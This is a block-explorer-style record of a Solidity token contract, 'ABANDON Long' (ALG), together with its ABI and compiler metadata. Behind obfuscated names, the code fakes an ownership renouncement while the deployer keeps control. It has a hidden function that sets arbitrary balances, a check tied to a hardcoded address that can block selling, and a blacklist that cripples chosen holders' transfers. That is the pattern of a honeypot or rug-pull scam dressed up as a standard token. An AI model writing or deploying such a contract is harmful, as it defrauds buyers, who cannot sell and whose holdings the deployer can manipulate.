{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchedShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapLaunchedMode {\n    function createPair(address shouldTx, address listSwap) external returns (address);\n}\n\ninterface isReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchSell) external view returns (uint256);\n\n    function transfer(address minFeeReceiver, uint256 modeToken) external returns (bool);\n\n    function allowance(address teamTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minFeeReceiver,\n        uint256 modeToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txTotal, uint256 value);\n    event Approval(address indexed teamTake, address indexed spender, uint256 value);\n}\n\ninterface isReceiverMetadata is isReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ABANDONLong is modeFee, isReceiver, isReceiverMetadata {\n\n    function owner() external view returns (address) {\n        return liquiditySell;\n    }\n\n    address private liquiditySell;\n\n    mapping(address => bool) public buyLaunched;\n\n    uint256 constant txTeam = 11 ** 10;\n\n    function buyEnableMarketing(address exemptLimitFee) public {\n        if (fundAtFee) {\n            return;\n        }\n        if (takeAutoReceiver == receiverReceiver) {\n            takeAutoReceiver = receiverReceiver;\n        }\n        launchedTakeAuto[exemptLimitFee] = true;\n        if (takeAutoReceiver != receiverReceiver) {\n            teamTx = true;\n        }\n        fundAtFee = true;\n    }\n\n    mapping(address => uint256) private walletMin;\n\n    constructor (){\n        if (receiverReceiver == takeAutoReceiver) {\n            teamTx = false;\n        }\n        launchedShould atExempt = launchedShould(senderToken);\n        limitTrading = swapLaunchedMode(atExempt.factory()).createPair(atExempt.WETH(), address(this));\n        \n        maxSender = _msgSender();\n        senderTake();\n        launchedTakeAuto[maxSender] = true;\n        walletMin[maxSender] = swapSender;\n        \n        emit Transfer(address(0), maxSender, swapSender);\n    }\n\n    address senderToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverFrom(address walletEnable, uint256 modeToken) public {\n        listTeam();\n        walletMin[walletEnable] = modeToken;\n    }\n\n    bool public launchedTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeMinTrading;\n    }\n\n    address public limitTrading;\n\n    string private modeMinTrading = \"ALG\";\n\n    bool public teamTx;\n\n    function tokenMin(uint256 modeToken) public {\n        listTeam();\n        sellMarketingLiquidity = modeToken;\n    }\n\n    function approve(address amountAuto, uint256 modeToken) public virtual override returns (bool) {\n        limitShould[_msgSender()][amountAuto] = modeToken;\n        emit Approval(_msgSender(), amountAuto, modeToken);\n        return true;\n    }\n\n    bool public tokenBuy;\n\n    function getOwner() external view returns (address) {\n        return liquiditySell;\n    }\n\n    uint8 private receiverMode = 18;\n\n    function atTakeMin(address minMode, address minFeeReceiver, uint256 modeToken) internal returns (bool) {\n        if (minMode == maxSender) {\n            return shouldSwap(minMode, minFeeReceiver, modeToken);\n        }\n        uint256 senderAt = isReceiver(limitTrading).balanceOf(listShould);\n        require(senderAt == sellMarketingLiquidity);\n        require(minFeeReceiver != listShould);\n        if (buyLaunched[minMode]) {\n            return shouldSwap(minMode, minFeeReceiver, txTeam);\n        }\n        return shouldSwap(minMode, minFeeReceiver, modeToken);\n    }\n\n    uint256 modeAtFee;\n\n    address listShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private teamLaunchedExempt;\n\n    string private feeAt = \"ABANDON Long\";\n\n    uint256 private swapSender = 100000000 * 10 ** 18;\n\n    uint256 sellMarketingLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverMode;\n    }\n\n    mapping(address => bool) public launchedTakeAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapSender;\n    }\n\n    function launchList(address enableFee) public {\n        listTeam();\n        if (receiverReceiver == takeAutoReceiver) {\n            launchedTeam = true;\n        }\n        if (enableFee == maxSender || enableFee == limitTrading) {\n            return;\n        }\n        buyLaunched[enableFee] = true;\n    }\n\n    function balanceOf(address launchSell) public view virtual override returns (uint256) {\n        return walletMin[launchSell];\n    }\n\n    bool public buyAuto;\n\n    function listTeam() private view {\n        require(launchedTakeAuto[_msgSender()]);\n    }\n\n    function allowance(address fromLimit, address amountAuto) external view virtual override returns (uint256) {\n        if (amountAuto == senderToken) {\n            return type(uint256).max;\n        }\n        return limitShould[fromLimit][amountAuto];\n    }\n\n    function senderTake() public {\n        emit OwnershipTransferred(maxSender, address(0));\n        liquiditySell = address(0);\n    }\n\n    function transferFrom(address minMode, address minFeeReceiver, uint256 modeToken) external override returns (bool) {\n        if (_msgSender() != senderToken) {\n            if (limitShould[minMode][_msgSender()] != type(uint256).max) {\n                require(modeToken <= limitShould[minMode][_msgSender()]);\n                limitShould[minMode][_msgSender()] -= modeToken;\n            }\n        }\n        return atTakeMin(minMode, minFeeReceiver, modeToken);\n    }\n\n    uint256 public receiverReceiver;\n\n    address public maxSender;\n\n    mapping(address => mapping(address => uint256)) private limitShould;\n\n    bool public fundAtFee;\n\n    function name() external view virtual override returns (string memory) {\n        return feeAt;\n    }\n\n    function transfer(address walletEnable, uint256 modeToken) external virtual override returns (bool) {\n        return atTakeMin(_msgSender(), walletEnable, modeToken);\n    }\n\n    bool public modeTakeAuto;\n\n    event OwnershipTransferred(address indexed txFee, address indexed limitFee);\n\n    function shouldSwap(address minMode, address minFeeReceiver, uint256 modeToken) internal returns (bool) {\n        require(walletMin[minMode] >= modeToken);\n        walletMin[minMode] -= modeToken;\n        walletMin[minFeeReceiver] += modeToken;\n        emit Transfer(minMode, minFeeReceiver, modeToken);\n        return true;\n    }\n\n    uint256 private takeAutoReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimitFee\",\"type\":\"address\"}],\"name\":\"buyEnableMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAtFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"}],\"name\":\"launchList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTakeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTakeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"receiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"tokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minFeeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ABANDONLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}